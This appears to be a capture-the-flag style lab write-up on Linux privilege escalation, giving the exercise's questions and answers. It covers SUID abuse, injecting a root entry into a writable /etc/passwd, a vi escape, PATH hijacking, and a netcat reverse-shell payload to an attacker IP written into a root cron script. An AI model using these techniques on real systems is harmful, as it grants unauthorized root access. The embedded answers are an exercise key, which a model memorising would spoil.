# Common Linux Privilege Escalation

## Understanding Privesc

At it's core privilege escalation usually involves going from having lower permissions on a system to having higher permissions on the system. Usually this is done through the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

Rarely when doing a penetration test do you immediately gain access to a root account. Escalating privileges is necessary in order to do many things on the system including:

* Resetting Passwords
* Bypassing access controls to compromise protected data
* Edit software configurations
* Enable persistence, so you can access the machine again later.
* Change privilege of users
* Any other administrator/super user commands as they are needed

## Direction of Privilege Escalation

There are two main privilege escalation variants:

* Horizontal privilege escalation - Taking over another user account with the same privileges as the current account. This can be useful to access their files and while searching for other ways to elevate access.
* Vertical privilege escalation  - This is where higher privileges are obtained from an existing account that has already been compromised. Usually this involves gaining administrator/root privileges.

## Enumeration

LinEnum is a bash script that performs commands related to privilege escalation. It is important to understand what commands LinEnum executes so that you can manually enumerate if in a situation that you cannot use scripts.

LinEnum can be downloaded [here](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh "Github"). Personally I have it stored in my `/opt` directory.

---

In order to get the script on the target machine, navigate to the directory that LinEnum is stored in. From here start a Python web server using `python3 -m http.server 8000`. Then on the target machine you can use `wget <YOUR_IP>:<PORT>/LinEnum.sh`. Once the file is on the target machine it can be marked as executable with `chmod +x <FILENAME>`. Alternatively with sufficient permissions, copying the entire script on the attacker machine and pasting into a new file on the target using a terminal text editor also works. Simply save the file with a `.sh` extension and mark it as executable.

LinEnum is ran the same way as other bash scripts, `./LinEnum.sh`.

The LinEnum output is broken down into different sections, these are the main sections that will be focused on:
* Kernel - Kernel information is shown here.
* Can we read/write sensitive files? - The world-writeable files are shown below. Perhaps find a file that is usually closed off with permissions allowing a user to write to it.
* SUID Files - The output for SUID files is shown here. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions.
* Crontab Contents - The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. Sometimes these jobs can be manipulated in order to escalate privileges.

**Questions**

First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

Running LinEnum and LinPEAS on the system to properly enumerate more than is needed for this task

    1. What is the target's hostname?

polobox

    2. Look at the output of /etc/passwd how many "user[x]" are there on the system?

8

    3. How many available shells are there on the system?

4

    4. What is the name of the bash script that is set to run every 5 minutes by cron?

autoscript.sh

    5. What critical file has had its permissions changed to allow some users to write to it?

/etc/passwd

## Abusing SUID/GUID Files

The first step in Linux privilege escalation iss to check for files with the SUID/GUID but set. This means that the file can be run with the permissions of the file owner/group. If this is the super user then this may be possible to leverage in order to get a shell with these privileges.

In Linux, everything is a file, including directories and devices. These have permissions that allow or restrict three operations: read, write, execute. Quick reminder that read = 4, write = 2, execute = 1. If permissions are set using `chmod <FILE> 755` then the file will be rwxr-xr-x. When special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID):

* SUID rws-rwx-rwx
* SGID rwx-rws-rwx

If you wish to search for SUID/SGID binaries manually then we can do so with the command `find / -perm -u=s -type f 2>/dev/null`. This command can be broken down like so:
* find - Find command
* / - Search whole system
* -perm - Search for files with specific permissions
* -u=s - Any of the permission bits *mode* are set for the file. Symbolic modes are accepted in this form
* -type f - Only search for files
* 2>dev/null - Suppress errors

**Questions**

    1. What is the path of the file in user3's directory that stands out to you?

/home/user3/shell

Running this binary immediately gives a shell for the root user.

## Exploiting Writeable /etc/passwd

Continuing with the enumeration of users, we found out that user7 is a member of the root group with gid 0. The LinEnum scan also showed us that this file was writeable to members of the root group meaning that user7 can also write to the /etc/passwd file.

The /etc/passwd file stores information that is required during login. It stores user account information. It contains a list of the system's accounts, giving each account some useful information like user ID, group ID, home directory, shell, and more.

While /etc/passwd should have read permissions, write access should only be given to the superuser/root account. If a user has been added to a write-allowed group, there is a vulnerability that can allow the creation of a root user that we can access.

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Generally, /etc/passwd file entry looks as follows:

`test:x:0:0:root:/root:/bin/bash`

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exist then users directory becomes /
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell but it does not have to be.

If /etc/passwd is writeable, a new line entry can be added in order to create a new user. We add the password hash of our choice and set the UID, GID and shell to root, allowing us to log on as the root user.


**Questions**

First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"

    1. Having read the information above, what direction privilege escalation is this attack?

Vertical

Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: `"openssl passwd -1 -salt \[salt\] \[password\]"`

    2. What is the hash created by using this command with the salt, "new" and the password "123"?

$1$new$p7ptkEKU1HnaHpRtzNizS1

    3. Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

Adding this entry to the `/etc/passwd` file allows me to switch to a newly created user with root permissions.

## Escaping Vi Editor

*Sudo -l*

This exploit comes down to the effectiveness of our enumeration. If you have access to a user account you should always use `sudo -l` to list the commands you are able to use as a super user on that account. If you are able to use certain commands, there may be a way to maintain the privileges as a form of escalation.

If you find a misconfigured binary during enumeration [GTFOBins](https://gtfobins.github.io/ "GTFOBins") is very good resource for researching how to exploit them.

**Questions**

First, let's exit out of root from our previous task by typing `exit`. Then use `su` to swap to user8, with the password "password"

    1. Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

NOPASSWD

    2. So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

Doing this and running `:!bash` gave a bash terminal as the root user.

## Exploiting Crontab

The Cron daemon is a long running process that executes commands at specific dates and times. This can be used to schedule activities, as one time events or as recurring tasks.

The command `cat /etc/crontab` can be used to view the currectly scheduled cronjobs. This is an easy thing to check manually when enumerating.

Cronjobs exist in a certain format and it is worth knowing how to read that format

* \# = ID
* m = Minute
* h = Hour
* dom = Day of the month
* mon = Month
* dow = Day of the week
* user = What user the command will run as
* command = What command should be run

---

From the LinEnum scan, we found a file `autoscript.sh` on user4's desktop is scheduled to run every 5 minutes. It is owned by root meaning that it will run with root privileges, despite the fact that this file can be written to. Let's create a payload with msfvenom and get it to be executed by cron.

**Questions**

    1. What is the flag to specify a payload in msfvenom?

`-p`

Creating a payload with `msfvenom -p cmd/unix/reverse_netcat LHOST=10.11.32.89 LPORT=8889`

payload = `mkfifo /tmp/whqial; nc 10.11.32.89 8889 0</tmp/whqial | /bin/sh >/tmp/whqial 2>&1; rm /tmp/whqial`

    2. What directory is the "autoscript.sh" under?

/home/user4/Desktop

Start a netcat listener on the attacking machine.

Using `echo "mkfifo /tmp/whqial; nc 10.11.32.89 8889 0</tmp/whqial | /bin/sh >/tmp/whqial 2>&1; rm /tmp/whqial" > autoscript.sh` to overwrite the file with our malicious code on the victim machine.

After a few minutes the code is executed and we have a root shell that I was also able to stabilise.

## Exploiting PATH Variable

PATH is an environmental variable in Linux and Unix operating systems that specifies directories that hold executable programs. It is very simple to view the path of the relevant user with the command `echo $PATH`.

If we have an SUID binary that we can see is calling the system shell to do a basic process, we can overwrite the PATH variable to a location of choice so that the system runs an executable written by us. As with any SUID file, it will run this command with the same privileges as the owner of the SUID file.

**Questions**

    1. Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

ls

Using the /tmp directory as our location for our fake `ls` command

    2 What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating?

`echo "/bin/bash" > ls`.


    3. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?

chmod +x ls

Now we need to manipulate the path variable so that it points to our ls file when it is ran. This can be done using the command `export PATH=/tmp:$PATH`. Now running the script will execute our file instead and will create a shell as the root user. To gain the original path back run `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH`

## Expanding Your Knowledge

There is never a magic answer for Linux Privilege Escalation. These are just a few things to look out for when attempting to escalate privileges. Checklists are a good way to ensure you haven't missed anything during our enumeration process and provide a resource to check how to do things if you are not sure about the commands to use in a given situation.

* [PayloadsAllTheThings Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools "Github")
* [OSCPGuide Privesc](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html "Gitbooks")